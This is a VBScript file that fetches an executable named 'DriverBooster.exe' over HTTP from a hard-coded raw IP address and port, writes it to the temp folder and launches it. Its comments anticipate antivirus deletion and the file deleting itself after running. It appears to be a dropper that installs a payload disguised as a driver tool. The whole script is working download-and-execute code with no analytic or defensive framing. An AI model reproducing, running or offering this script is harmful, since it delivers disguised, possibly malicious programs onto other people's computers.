Option Explicit

Dim shell, fso, http, stream
Dim sUrl, sDest, rc

' Turn on error handling FIRST
On Error Resume Next

Set shell = CreateObject("WScript.Shell")
If Err.Number <> 0 Then
    WScript.Echo "CreateObject WScript.Shell failed: " & Err.Description
    WScript.Quit 1
End If

Set fso = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then
    WScript.Echo "CreateObject Scripting.FileSystemObject failed: " & Err.Description
    WScript.Quit 1
End If

sUrl  = "http://135.125.222.22:8040/DriverBooster.exe"
sDest = shell.ExpandEnvironmentStrings("%TEMP%") & "\DriverBooster.exe"

WScript.Echo "URL:  " & sUrl
WScript.Echo "Dest: " & sDest

' --- Download ---
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number <> 0 Then
    WScript.Echo "CreateObject WinHttp failed: " & Err.Description
    WScript.Quit 1
End If

http.Open "GET", sUrl, False
If Err.Number <> 0 Then
    WScript.Echo "HTTP Open failed: " & Err.Description
    WScript.Quit 1
End If

http.Send
If Err.Number <> 0 Then
    WScript.Echo "HTTP Send failed: " & Err.Description
    WScript.Quit 1
End If

If http.Status <> 200 Then
    WScript.Echo "HTTP status: " & http.Status
    WScript.Quit 1
End If

WScript.Echo "Downloaded body length: " & LenB(http.ResponseBody) & " bytes"

' Delete old file if present
If fso.FileExists(sDest) Then
    fso.DeleteFile sDest, True
    If Err.Number <> 0 Then
        WScript.Echo "Delete old file failed: " & Err.Description
        WScript.Quit 1
    End If
End If

' --- Write response body to disk ---
Set stream = CreateObject("ADODB.Stream")
If Err.Number <> 0 Then
    WScript.Echo "CreateObject ADODB.Stream failed: " & Err.Description
    WScript.Quit 1
End If

stream.Type = 1                 ' adTypeBinary
stream.Open
If Err.Number <> 0 Then
    WScript.Echo "Stream.Open failed: " & Err.Description
    WScript.Quit 1
End If

stream.Write http.ResponseBody
If Err.Number <> 0 Then
    WScript.Echo "Stream.Write failed: " & Err.Description
    stream.Close
    WScript.Quit 1
End If

stream.SaveToFile sDest, 2      ' adSaveCreateOverWrite
If Err.Number <> 0 Then
    WScript.Echo "Save failed: " & Err.Description
    stream.Close
    WScript.Quit 1
End If

stream.Close
Set stream = Nothing

' ============================================================
' --- LAUNCH (DIAGNOSTIC) ---
' ============================================================
WScript.Echo "----- Launch stage -----"

If fso.FileExists(sDest) Then
    WScript.Echo "File exists. Size = " & fso.GetFile(sDest).Size & " bytes"
Else
    WScript.Echo "ERROR: file does not exist right after SaveToFile (AV likely deleted it)"
    WScript.Quit 1
End If

WScript.Echo "About to run: [" & sDest & "]"
WScript.Echo "Command line: [" & """" & sDest & """" & "]"

' Visible window (1) + wait for exit (True) so we can see what happens
rc = shell.Run("""" & sDest & """", 1, True)

WScript.Echo "Run returned: " & rc
WScript.Echo "Last error:   " & Err.Number & " " & Err.Description
If Err.Number <> 0 Then Err.Clear

' Check again in case the process deleted/moved itself
If fso.FileExists(sDest) Then
    WScript.Echo "File still present after run. Size = " & fso.GetFile(sDest).Size & " bytes"
Else
    WScript.Echo "File is gone after run (self-delete or AV cleanup)"
End If

WScript.Echo "----- Done -----"
